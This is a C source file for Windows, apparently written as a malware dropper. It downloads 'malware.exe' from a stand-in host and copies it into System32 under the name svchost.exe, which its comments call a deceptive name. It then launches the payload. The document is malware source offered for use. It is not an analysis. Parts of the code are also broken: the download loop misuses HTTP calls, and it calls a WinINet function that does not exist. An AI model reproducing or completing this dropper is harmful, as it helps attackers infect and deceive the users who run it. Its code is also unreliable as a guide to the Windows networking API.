#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define URL1 "http://www.example.com/malware.exe"
#define URL2 "http://www.example.com/secondary_url.txt"

void downloadFile(char* url, char* localPath) {
    HINTERNET hSession = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession == NULL) {
        printf("Failed to open internet session.\n");
        return;
    }

    HINTERNET hConnect = InternetConnect(hSession, "www.example.com", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (hConnect == NULL) {
        printf("Failed to connect to server.\n");
        InternetCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", url, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 1);
    if (hRequest == NULL) {
        printf("Failed to open request.\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    char buffer[4096];
    DWORD bytesRead;

    if (!HttpSendRequest(hRequest, NULL, 0, buffer, 0)) {
        printf("Failed to send HTTP request.\n");
        HttpCloseRequestHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    FILE* file = fopen(localPath, "wb");
    if (file == NULL) {
        printf("Failed to open local file for writing.\n");
        HttpCloseRequestHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    do {
        HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &bytesRead, NULL, NULL);

        if (HttpSendRequest(hRequest, NULL, 0, buffer, sizeof(buffer)) != TRUE) {
            printf("Failed to send HTTP request.\n");
            fclose(file);
            HttpCloseRequestHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return;
        }

        fwrite(buffer, bytesRead, 1, file);

    } while (bytesRead == sizeof(buffer));

    fclose(file);
    printf("File downloaded successfully.\n");

    HttpCloseRequestHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

void dearchive(char* archivePath) {
    // This function dearchives the secondary URL into a string
    char buffer[512];
    FILE* file = fopen(archivePath, "rb");
    if (file == NULL) {
        printf("Failed to open archive file.\n");
        return;
    }

    fread(buffer, sizeof(buffer), 1, file);

    // This is an example of a simple dearchive function. In reality,
    // it would decode the secondary URL and store it in a string.
    char* url = "http://www.example.com/malware.exe";
    printf("Decoded URL: %s\n", url);
}

void fetch(char* url, char* localPath) {
    downloadFile(url, localPath);
}

void savePayload(char* payloadPath) {
    // This function saves the payload to a system folder with a deceptive name
    char command[512];
    sprintf(command, "copy \"%s\" %s", payloadPath, "%windir%\\System32\\svchost.exe");

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

void trigger(char* payloadPath) {
    // This function launches the downloaded file as a new process and terminates the dropper
    char command[512];
    sprintf(command, "\"%s\"", payloadPath);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    TerminateProcess(pi.hProcess, 0);
}

int main() {
    char archivePath[256] = "archive.txt";
    fetch(URL1, "payload.exe");

    dearchive(archivePath);

    savePayload("payload.exe");

    trigger("payload.exe");
}
